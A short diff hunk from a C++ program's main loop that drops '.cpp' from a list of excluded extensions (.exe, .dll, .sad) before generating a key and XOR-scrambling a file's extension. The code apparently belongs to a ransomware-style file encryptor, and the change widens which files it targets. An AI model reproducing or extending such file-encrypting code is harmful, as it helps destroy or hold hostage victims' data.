@@ -222,8 +222,7 @@ int main(int argc, char* argv[]){
 
 				if(ext != ".exe" and 
 					ext != ".dll" and
-					ext != ".sad" and
-					ext != ".cpp"){
+					ext != ".sad"){
 
 					BYTE* internal_key 		 = GenKey(4);//decrypt header
 					DWORD internalExtension  = *(DWORD*)(BYTE*)extension ^ *(DWORD*)internal_key;
